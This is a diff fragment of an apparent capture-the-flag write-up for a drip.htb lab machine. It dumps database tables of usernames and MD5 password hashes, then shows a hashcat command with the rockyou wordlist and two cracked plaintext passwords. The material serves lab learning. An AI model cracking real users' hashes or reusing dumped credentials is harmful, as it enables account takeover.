@@ -389,5 +389,21 @@ COPY public."Admins" (id, username, password, email) FROM stdin;
 1	bcase	dc5484871bc95c4eab58032884be7225	bcase@drip.htb
 2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
 3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
+
+COPY public."Users" (id, username, password, email, host_header, ip_address) FROM stdin;
+5001	support	d9b9ecbf29db8054b21f303072b37c4e	support@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
+5002	bcase	1eace53df87b9a15a37fdc11da2d298d	bcase@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
+5003	ebelford	0cebd84e066fd988e89083879e88c5f9	ebelford@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
 ```
+
+Ill load these into hashcat
+
+```python
+hashcat hashes.txt -m 0 /usr/share/wordlists/rockyou.txt --user
+
+cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#         
+8bbd7f88841b4223ae63c8848969be86:ThePlague61780
+```
+
+Two of the hashes cracked!
 
